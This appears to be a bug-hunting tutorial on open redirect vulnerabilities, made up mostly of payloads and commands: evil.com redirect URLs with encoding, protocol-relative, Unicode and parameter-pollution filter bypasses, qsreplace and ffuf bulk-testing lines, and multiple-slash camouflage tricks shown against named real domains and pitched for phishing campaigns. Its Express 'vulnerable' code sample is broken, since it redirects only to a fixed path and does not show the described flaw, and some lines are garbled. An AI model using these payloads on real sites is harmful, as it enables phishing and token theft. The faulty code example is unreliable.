## Open Redirect 

An open redirect vulnerability occurs when a web application improperly incorporates user-controlled input into a URL redirection mechanism. This allows attackers to craft malicious URLs that redirect users to arbitrary external domains. Such vulnerabilities are often exploited for phishing attacks, as they leverage the credibility of the legitimate application's URL, SSL certificate, and domain.


### Example 

For example, an attacker could create a URL like

&nbsp;`https://legitimate-site.com/redirect?url=http://malicious-site.com`. 

&nbsp;When a user clicks this link, they are redirected to the attacker's domain, potentially exposing them to phishing or other malicious activities.


### Code Example 

```

const express = require('express');

const app = express();

const port = 3000;



app.post('/login', (req, res) => {

&nbsp; const { username, password } = req.body;

&nbsp; if (auth(username, password)) {

&nbsp;   res.redirect('/profile');

&nbsp; } else {

&nbsp;   res.render('login', { error: 'Incorrect Credentials Supplied' });

&nbsp; }

});



app.listen(port, () => {

&nbsp; console.log(`Listening on http://localhost:${port}`);

});



```



this code can make direct for any web site because no filter or validation ok the url . 



---

# How Hunting for Open Redirect



Find \*\*Open Redirect\*\* vulnerabilities efficiently using automation and smart payloads instead of manual testing.



---



## Collect URLs with Redirect Parameters


**Idea:** Target URLs that likely perform redirects.



**Tools:**



* Burp Suite / OWASP ZAP (Spider)

* ParamSpider

* Waybackurls

* grep



**Common parameters:**



```

redirect, url, next, target, dest, goto, callback, return, continue

```



---



##  Basic Redirect Testing



Replace the parameter value with an external domain.



**Example:**



```

/redirect?next=/login

→ /redirect?next=https://evil.com

```



&nbsp;If it redirects → Vulnerable



**Extra idea:**

Test relative paths:



```

?next=//evil.com

```



---



## Try Alternate Parameter Names



Developers often use non-standard names.


**Examples:**


```

?target=https://evil.com

?dest=https://evil.com

?goto=https://evil.com

```



**Extra idea:**

Look for business logic parameters:



```

?continue=

?returnUrl=

```



---



## Encoding Bypasses



Encoding may bypass validation.



**Payloads:**



```

URL encoded: https%3A%2F%2Fevil.com

Double encoded: %252Fevil.com

Mixed: https:%2f%2fevil.com

```



---



## Protocol-Relative URLs (//)



If `http` or `https` is blocked:



```

?url=//evil.com

```



&nbsp;Browsers interpret this as an external redirect.



**Extra idea:**



```

////evil.com

```



---



##  Base64-Encoded Redirects



Some apps encode redirect URLs.



**Example:**



```

?url=aHR0cHM6Ly9nb29nbGUuY29t

→ https://google.com

```



Replace it with:



```

Base64(https://evil.com)

```



**Extra idea:**

Try double Base64 encoding.



---



##  Bulk Testing with QSReplace



Test many URLs at once.



```

cat urls.txt | qsreplace "https://evil.com"

```



Any URL that redirects = potential issue.



---



## JavaScript-Based Redirects



Redirect logic may exist in JS files.



**Tool:**



```

LinkFinder

```



**Look for:**



```

window.location

document.location

location.href

```



---



## Parameter Fuzzing with FFUF



Discover hidden redirect parameters.



```

ffuf -u https://site/path?FUZZ=https://evil.com -w params.txt

```



**Extra idea:**

Use API or legacy parameter wordlists.



---



## DOM-Based Redirects



Check client-side redirects in DevTools.



**Keywords:**



```

redirect, location, navigate

```



**Extra idea:**

Parameters sourced from:



```

window.location.search

```



---



##  Advanced / Edge Case Payloads



Exploit URL parsing quirks.



**Examples:**



```

https://google.com@evil.com

evil.com/.

evil.com\\@google.com

```



**Unicode bypasses:**



```

ｅvil.com

∕∕evil.com

```



**Parameter pollution:**



```

?next=/login\&next=https://evil.com

```



---



## Key Takeaway



Open Redirects can lead to:



* Phishing

* OAuth token leakage

* Account takeover (when chained)

* Trust abuse



They’re often **high impact when combined with other bugs**.



---

## Open Redirect via URL Parsing Confusion (`//` \& `///`)



### Idea



Some applications perform redirects using user-controlled paths without properly validating how browsers interpret special URL patterns like `//`, `///`, or `////`.

Browsers treat these patterns as **scheme-relative URLs**, which may result in a redirect to an external domain even if no explicit redirect parameter exists.



---



### Example Payload



```

www.affirm.com///google.com/?www.affirm.com/?category=interviwe\&page=3

```



### Technical Explanation



* `www.affirm.com` makes the URL appear trusted.

* `///google.com` is interpreted by browsers as:



&nbsp; ```

&nbsp; https://google.com

&nbsp; ```

* Everything after `?` is treated as a query string and used only for **visual camouflage**.

* If the backend reflects or redirects to this path directly:



&nbsp; ```

&nbsp; Location: ///google.com

&nbsp; ```



&nbsp; the browser will navigate to an external domain.



---



### Why This Works



* The server treats the input as a **relative path**.

* The browser interprets it as an **absolute external URL**.

* No validation is performed on scheme-relative URLs.



---



### Impact



**Open Redirect** to arbitrary external domains

* Enables **phishing attacks** using trusted domains

* Can be chained with:



&nbsp; * OAuth / SSO flows

&nbsp; * Password reset links

&nbsp; * Email verification URLs

* May lead to **token leakage** or **account takeover** when combined with other vulnerabilities



---



## Open Redirect Using `////` (Multiple Slash Bypass)



### Idea



Multiple leading slashes can confuse URL parsers and bypass filters that only block `http://` or `https://`.



---



### Example Payload



```

////bing.com/?www.omise.co/?category=ABC\&page=3

```



---



### Technical Explanation



* `////bing.com` is normalized by the browser to:



&nbsp; ```

&nbsp; https://bing.com

&nbsp; ```

* Some backends incorrectly assume this is a safe internal path.

* When used in redirects, it results in an external navigation.



---



### Impact



* Silent redirection to attacker-controlled domains

* High success rate in **email phishing campaigns**

* Bypasses naive URL allowlists and regex-based filters



---



## Visual Camouflage via Query String Injection


### Idea

Attackers add trusted-looking domains inside the query string to make malicious links appear legitimate.

---

### Example Payload

```

?www.affirm.com/?category=interviwe\&page=3

```





### Technical Explanation



* Query parameters do not affect the redirect target.

* They are used purely for **social engineering** and filter bypass.

* Security systems and users may incorrectly assume the redirect is internal.



---



### Impact



* Increased phishing click-through rate

* Easier bypass of automated URL scanners

* Reduced user suspicion



---



## Key Takeaway



Open Redirect vulnerabilities do not always require classic parameters like `redirect` or `next`.

**URL parsing inconsistencies between servers and browsers** can introduce high-impact redirect issues even in seemingly safe endpoints.



---



## Don't forget encodding techniqe 



You can fillter pybassing by using some encode type 



1. url encode

2. dotes encode

3. double encode

4. full encode

---

